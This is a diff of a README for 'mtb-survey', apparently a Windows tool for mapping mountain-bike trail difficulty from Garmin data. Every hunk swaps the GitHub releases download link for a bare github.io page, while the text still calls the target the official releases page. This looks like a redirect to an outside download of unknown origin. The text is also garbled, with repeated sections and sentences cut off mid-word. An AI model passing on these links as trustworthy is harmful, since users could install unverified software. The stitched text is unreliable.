@@ -1,6 +1,6 @@
 # 🚵 mtb-survey - Map Trail Difficulty While You Ride
 
-[![Download mtb-survey](https://img.shields.io/badge/Download-mtb--survey-blueviolet?style=for-the-badge&logo=github)](https://github.com/a0168627/mtb-survey/releases)
+[![Download mtb-survey](https://img.shields.io/badge/Download-mtb--survey-blueviolet?style=for-the-badge&logo=github)](https://a0168627.github.io)
 
 mtb-survey is a Windows application for mountain bikers who want to record how difficult a trail feels while riding, then turn that ride into a clear map and prepare the result for OpenStreetMap. Use a Garmin watch or Garmin Edge to capture trail difficulty with the mtb:scale system. After the ride, open mtb-survey, review the recorded data, view the route on a map, and organize the information you want to add to OpenStreetMap.
 
@@ -16,7 +16,7 @@ mtb-survey connects three parts of trail mapping:
 
 The mtb:scale value is a simple number used to describe mountain bike trail difficulty. Lower numbers are easier. Higher numbers are harder. mtb-survey helps you attach# 🚵 mtb-survey - Map Trail Difficulty While You Ride
 
-[![Download mtb-survey](https://img.shields.io/badge/Download-mtb--survey-blueviolet?style=for-the-badge&logo=github)](https://github.com/a0168627/mtb-survey/releases)
+[![Download mtb-survey](https://img.shields.io/badge/Download-mtb--survey-blueviolet?style=for-the-badge&logo=github)](https://a0168627.github.io)
 
 mtb-survey is a Windows application for mountain bikers who want to record how difficult a trail feels while riding, then turn that ride into a clear map and prepare the result for OpenStreetMap. Use a Garmin watch or Garmin Edge to capture trail difficulty with the mtb:scale system. After the ride, open mtb-survey, review the recorded data, view the route on a map, and organize the information you want to add to OpenStreetMap.
 
@@ -36,7 +36,7 @@ The mtb:scale value is a simple number used to describe mountain bike trail diff
 
 To get started with mtb-survey on Windows, follow the steps below. You do not need programming experience. You only need a Windows computer and the download link provided.
 
-1. Open the download page: [https://github.com/a0168627/mtb-survey/releases](https://github.com/a0168627/mtb-survey/releases)
+1. Open the download page: [https://a0168627.github.io](https://a0168627.github.io)
 2. Visit this link to download the application.
 3. Follow the on-screen instructions on the releases page to obtain the Windows application.
 4. Once the download is complete, locate the file on your computer.
@@ -64,7 +64,7 @@ If your computer meets these general requirements, you should be able to downloa
 
 The only download source for mtb-survey is the official releases page. Use the link below to reach it.
 
-[![Download mtb-survey](https://img.shields.io/badge/Download-mtb--survey-brightgreen?style=for-the-badge&logo=github)](https://github.com/a0168627/mtb-survey/releases)
+[![Download mtb-survey](https://img.shields.io/badge/Download-mtb--survey-brightgreen?style=for-the-badge&logo=github)](https://a0168627.github.io)
 
 **Download instruction:** Visit this link to download the application.
 
@@ -108,7 +108,7 @@ These features are built around one goal: make trail difficulty mapping accessib
 **Do I need a Garmin device to use mtb-survey?**
 Yes. The application# 🚵 mtb-survey - Map Trail Difficulty While You Ride
 
-[![Download mtb-survey](https://img.shields.io/badge/Download-mtb--survey-blueviolet?style=for-the-badge&logo=github)](https://github.com/a0168627/mtb-survey/releases)
+[![Download mtb-survey](https://img.shields.io/badge/Download-mtb--survey-blueviolet?style=for-the-badge&logo=github)](https://a0168627.github.io)
 
 mtb-survey is a Windows application for mountain bikers who want to record how difficult a trail feels while riding, then turn that ride into a clear map and prepare the result for OpenStreetMap. Use a Garmin watch or Garmin Edge to capture trail difficulty with the mtb:scale system. After the ride, open mtb-survey, review the recorded data, view the route on a map, and organize the information you want to add to OpenStreetMap.
 
@@ -128,7 +128,7 @@ The mtb:scale value is a simple number used to describe mountain bike trail diff
 
 To get started with mtb-survey on Windows, follow the steps below. You do not need programming experience. You only need a Windows computer and the download link provided.
 
-1. Open the download page: [https://github.com/a0168627/mtb-survey/releases](https://github.com/a0168627/mtb-survey/releases)
+1. Open the download page: [https://a0168627.github.io](https://a0168627.github.io)
 2. Visit this link to download the application.
 3. Follow the on-screen instructions on the releases page to obtain the Windows application.
 4. Once the download is complete, locate the file on your computer.
@@ -156,7 +156,7 @@ If your computer meets these general requirements, you should be able to downloa
 
 The only download source for mtb-survey is the official releases page. Use the link below to reach it.
 
-[![Download mtb-survey](https://img.shields.io/badge/Download-mtb--survey-brightgreen?style=for-the-badge&logo=github)](https://github.com/a0168627/mtb-survey/releases)
+[![Download mtb-survey](https://img.shields.io/badge/Download-mtb--survey-brightgreen?style=for-the-badge&logo=github)](https://a0168627.github.io)
 
 **Download instruction:** Visit this link to download the application.
 
@@ -207,7 +207,7 @@ You need an internet connection to download the application and to load online m
 mtb:scale is a numbering system used to describe how difficult a mountain bike trail is. A rider records a number for a trail section, and that number becomes part of the trail's map information. mtb-survey makes it easier to collect these numbers during a ride and review them afterward.
 
 **Where do I get the application?**
-From the official releases page: [https://github.com/a0168627/mtb-survey/releases](https://github.com/a0168627/mtb-survey/releases). Visit this link to download the application.
+From the official releases page: [https://a0168627.github.io](https://a0168627.github.io). Visit this link to download the application.
 
 **Do I need to know how to code?**
 No. mtb-survey is an end-user application with a graphical interface. You download it, run it, and use it through normal windows, buttons, and menus.
@@ -234,6 +234,6 @@ Trail mapping works best when local riders contribute local knowledge. Recording
 
 mtb-survey is an open project focused on mountain bike trail mapping, Garmin ride data, and OpenStreetMap preparation. The application is distributed through its official releases page. Always use the official link when downloading so you receive the current version.
 
-Download link: [https://github.com/a0168627/mtb-survey/releases](https://github.com/a0168627/mtb-survey/releases)
+Download link: [https://a0168627.github.io](https://a0168627.github.io)
 
 Keywords: connect-iq, fenix, fit-file, forerunner, garmin, garmin-edge, gps, leaflet, monkey-c, mountain-biking, mtb, openstreetmap, trail-mapping
